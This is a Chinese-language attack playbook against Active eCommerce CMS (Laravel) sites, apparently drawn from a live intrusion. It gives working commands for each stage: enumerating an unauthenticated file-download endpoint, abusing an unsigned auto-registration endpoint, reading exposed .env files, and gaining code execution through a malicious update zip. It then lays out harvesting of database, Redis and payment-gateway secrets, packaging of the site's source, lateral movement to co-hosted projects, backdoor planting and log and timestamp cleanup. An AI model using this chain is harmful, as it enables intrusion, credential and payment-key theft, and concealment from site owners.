# Active eCommerce CMS（Laravel 8）产品级作战地图

> 实战: phpv4.88demo.cn (2026-09-22/23)。所有路径/参数/命令都来自运行中目标的实测，
> **凭据一律不落库**（本文件只写“去哪儿拿”，不写“拿到了什么”）。
> 指纹→入口→收割→横向→后门，照顺序走；单跑某一步也可。

## 0. 指纹识别

| 观测点 | 值 |
|---|---|
| 静态资源 | `/public/assets/css/aiz-core.css`（`aiz-` 前缀是 ActiveITzone 家族标志） |
| 路由 | `/aiz-uploader`（后台文件上传器）、`/admin`（多卖家后台）、`/seller`、`/install` |
| 页面 | 多卖家/多语言商城、`TikTok 商城`式伪装落地页（诈骗站常见） |
| Cookie | `active_ecommerce_cms_session` / `XSRF-TOKEN` |
| 版本 | 后台 → 系统更新页 / `composer.json` / `config/app.php` 里的 `VERSION`（盗版多为 6.x） |
| 同族 | Active eCommerce Store/ Delivery/ POS、以及二手套壳（`.env` 里 `APP_NAME` 多半没改） |

## 1. 免登录入口（先试，最省事）

### 1.1 未授权任意文件下载（v6.3.0，th3d1gger / WLB-2022090081）
源码逻辑：`attachment_download($id)` → `Upload::find($id)` → `Response::download(public_path($row->file_name))`，
**不校验登录**。包内记录全是 `uploads` 表的附件（含备份 zip、导出 sql、证件照、聊天文件）。

```bash
for i in $(seq 1 500); do
  code=$(curl -s -o "/tmp/dl_$i" -w '%{http_code}' "https://target/aiz-uploader/download/$i")
  sz=$(stat -c%s "/tmp/dl_$i" 2>/dev/null)
  [ "$code" = 200 ] && [ "$sz" -gt 100 ] && echo "HIT id=$i size=$sz type=$(file -b /tmp/dl_$i)"
done
```
- 高价值目标：`.zip/.sql/.env/备份`、`uploads/all/*` 下的项目附件、`chat` 附件
- 变体写法：`/aiz-uploadder/download/{id}`（部分老版本/改路由）；同族函数 `attachment_download`

### 1.2 `/auto-register`：无签名的卖家自动注册（认证绕过）
接受 base64(JSON)，**没有签名/时间戳/来源校验** → 直接建卖家号并自动登录（= 拿到后台低权身份）。

```bash
J=$(printf '%s' '{"name":"x","email":"<EMAIL-REDACTED>","password":"Passw0rd!","phone":"+10000000000"}' | base64 -w0)
curl -i -s -X POST 'https://target/auto-register' --data-urlencode "data=$J"
# 观察是否直接下发 session/cookie；成功后用该会话进 /seller 或 /admin
```
> 注意（重要）：注册类端点**空参也会真建号** → 零写入探测只用「缺字段/类型错」，别用空 POST。

## 2. DocumentRoot 错位（配置错，杀伤力最大）

Nginx `root` 指向**项目根** `/www/project/<site>/` 而不是 `.../public/` → 全部源码/配置/视图 HTTP 可读：

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://target/.env                  # 200 = 全量凭据
curl -s https://target/config/database.php | head                             # 明文配置
curl -s https://target/vendor/autoload.php -o /dev/null -w '%{http_code}\n'   # 200 = vendor 可执行
curl -s -o /dev/null -w '%{http_code}\n' https://target/storage/framework/views/xxx.php  # 500 = PHP 报错(说明真在解析)
curl -s https://target/resources/views/home.blade.php | head                  # 200 = 模板明文
```
- **`curl .env` 是优先级最高的单条命令**：Laravel `APP_KEY` + DB + Redis + SMTP + 支付密钥一次到手
- 存在误报：部分 Nginx 会把未知路径 200 回落到 `index.php` → **必须用响应体特征二次确认**（`.env` 是否含 `APP_NAME=`）
- 拿到源码结构后：`storage/framework/views/*.php` 是编译视图，`storage/logs/laravel.log` 常有 SQL/路径/凭据
- 若 `curl .env` 为 403/404，但仍能 200 读到 `config/*.php`/`vendor/*.php` → 同一条链，继续

## 3. 后台 → RCE（aiz-uploader + /update）

前置：admin（1.2 的注册号若权限不够，需后台提权/找 admin 凭据；也可以用 1.1 拉到的备份里翻 admin 记录）

```bash
# ① 登录拿会话 + CSRF
curl -s -c ck -b ck https://target/admin | grep -oP 'name="_token" value="\K[^"]+' | head -1 > tok
curl -s -b ck -c ck -X POST https://target/admin/login \
  --data-urlencode "_token=$(cat tok)" --data-urlencode "email=$EMAIL" --data-urlencode "password=$PASS" -o /dev/null -w '%{http_code}\n'

# ② 造包：解压目标是项目根 → 必须带 public/ 前缀；只放新增文件名，别覆盖现有文件
mkdir -p pkg/public && printf '<?php echo "MARK".(7*7);' > pkg/public/xx_marker.php
(cd pkg && zip -r ../p.zip .)

# ③ 上传（aiz-uploader 的字段名按前端表单抄，常见 aiz_file / file）
curl -s -b ck -F "aiz_file=@p.zip" https://target/aiz-uploader -o up.json ; cat up.json

# ④ 解压到项目根
curl -s -b ck -c ck -X POST https://target/update \
  --data-urlencode "_token=$(cat tok)" --data-urlencode "update_zip=$UPLOAD_ID" -o upd.html -w '%{http_code}\n'

# ⑤ 验证（两条路径都试，取决于 DocumentRoot）
curl -s https://target/public/xx_marker.php ; curl -s https://target/xx_marker.php
```
- 若 DocumentRoot 已指到 `public/`：包内就不需要 `public/` 前缀
- 覆盖式解压会炸站 → 包里**)绝不**带与站点同名的文件（`vendor/`、`config/`、`routes/`）
- 网页形态操作时：后台「System Update」页有上传框，直接走 UI 同一条链

## 4. 写进去之后的收割顺序

1. **`.env` 全字段**（有写权限就直接读项目根 `.env`）：`APP_KEY`（可伪造 Laravel session/cookie → 冒充任意用户）、`DB_*`、`REDIS_*`、`MAIL_*`、各支付网关（Stripe/PayStack/PayPal/万邦）、`FCM_*`、地图/Safe Browsing Key
2. **`config/*.php`、`chat/config.php`、同服其它项目的 `.env`**（Laravel 项目常共用同一套库口令）
3. **MySQL**: `SHOW DATABASES; SELECT user,host FROM mysql.user;` — 同口令复用是常态 → 逐库 `SHOW TABLES`
4. **Redis**（Laravel session/cache 常无密码）：`KEYS laravel*`、`GET laravel_database_*`；可读在线会话、可伪造登录态
5. **应用自身打包源码**（用户要“一模一样”的源码包时）：
   ```php
   $z=new ZipArchive(); $z->open('/tmp/s.zip',ZipArchive::CREATE|ZipArchive::OVERWRITE);
   $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator('/www/project/<site>'));
   foreach($it as $f){ $p=$f->getPathname(); if(is_file($p)) $z->addFile($p,$p); } $z->close();
   ```
   分批打包（按目录分卷）避免超时/内存爆；产物放 web 可达目录直接 `curl -O`
6. **翻数据库里的“变现面”**：支付通道 key/secret、采集/对接密钥、收款地址、订单与提现流水、PII 计数（用 `COUNT(*)` 给规模，不导出原始 PII）

## 5. 同服横向（多项目单机是常态）

```bash
ls -la /www/project/ /var/www/ /home/*/wwwroot 2>/dev/null     # 平级项目
grep -rn "DB_PASSWORD\|REDIS_PASSWORD\|API_KEY" /www/project/*/.env 2>/dev/null | head -50
find /www/project -maxdepth 3 -name 'docker-compose*.yml' -o -name '.env' | head
```
- `docker-compose.yml` → 容器编排里的**无鉴权服务**（MongoDB 27017 / Redis / RocketMQ / XMPP / MinIO）
- 同服 IM/客服/博彩项目往往独立成站 + 独立后台 + 非标端口（如 `:8787`）
- 每个项目再独立评估：`.env` → 库 → 后台路径（`/admin`、`/api/...`）

## 6. 后门与清理

- 落盘后门分级与触发设计 → `admin-backdoor-persistence`（含 Laravel 专属的框架核心/编译视图/Composer/addons 四种位置）
- 痕迹：临时包与 shell 删除、上传记录清理、时间戳对齐同目录、日志清理；**站点首页必须复验 200**
- 面板数据目录（宝塔 `/www/server/panel/data/`）属 root，`www` 读不到 → 「任意文件读」≠ 提权

## 7. 一句话顺序（时间紧时按这个跑）

`.env` 直读 → `aiz-uploader/download/{id}` 枚举捞备份 → `/auto-register` 拿身份 → 后台 `/update` 落 shell → 收割库/Redis/支付密钥 → 打包源码 → 同服横向 → 后门+清理
